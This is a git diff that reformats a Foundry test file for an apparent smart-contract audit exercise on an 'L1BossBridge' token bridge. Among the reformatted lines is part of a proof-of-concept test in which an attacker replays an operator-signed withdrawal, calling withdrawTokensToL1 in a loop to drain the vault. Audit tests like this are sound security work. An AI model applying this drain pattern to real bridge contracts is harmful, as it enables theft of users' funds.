@@ -1,14 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.34;
 
-import { Test, console2 } from "forge-std/Test.sol";
-import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
-import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
-import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
-import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
-import { L1BossBridge, L1Vault } from "../../src/audits/bossBridge/L1BossBridge.sol";
-import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
-import { L1Token } from "../../src/audits/bossBridge/L1Token.sol";
+import {Test, console2} from "forge-std/Test.sol";
+import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
+import {L1BossBridge, L1Vault} from "../../src/audits/bossBridge/L1BossBridge.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {L1Token} from "../../src/audits/bossBridge/L1Token.sol";
 
 contract L1BossBridgeTest is Test {
     event Deposit(address from, address to, uint256 amount);
@@ -213,10 +213,7 @@ contract L1BossBridgeTest is Test {
      * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
      * request from an account that never originated a transaction containing a successful deposit.
      */
-    function _signMessage(
-        bytes memory message,
-        uint256 privateKey
-    )
+    function _signMessage(bytes memory message, uint256 privateKey)
         private
         pure
         returns (uint8 v, bytes32 r, bytes32 s)
@@ -242,7 +239,7 @@ contract L1BossBridgeTest is Test {
 
     function testCanTransferFromVaultToVault() public {
         address attacker = makeAddr("attacker");
-        
+
         uint256 vaultBalance = 500 ether;
         deal(address(token), address(vault), vaultBalance);
 
@@ -272,16 +269,12 @@ contract L1BossBridgeTest is Test {
 
         // signer is going to sign the withdrawal request
         bytes memory message = abi.encode(
-            address(token), 
-            0, 
-            abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
+            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance))
         );
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
-            operator.key, 
-            MessageHashUtils.toEthSignedMessageHash(keccak256(message))
-        );
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
 
-        while(token.balanceOf(address(0)) > 0) {
+        while (token.balanceOf(address(0)) > 0) {
             tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
         }
 
